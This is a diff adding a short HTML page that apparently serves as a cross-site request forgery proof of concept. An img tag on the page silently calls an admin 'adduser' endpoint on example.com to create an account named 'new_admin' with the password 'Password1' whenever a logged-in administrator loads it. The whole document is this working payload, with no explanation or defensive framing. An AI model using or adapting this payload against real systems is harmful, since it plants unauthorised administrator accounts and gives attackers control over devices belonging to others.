@@ -1,0 +1,5 @@
+<html>
+    <body>
+        <img src="http://www.example.com/admin/auth.adduser.html?respage=config_results.nc.html&name=new_admin&pass=Password1&realm=TESTBOX.AdminRealm" />
+    </body>
+</html>
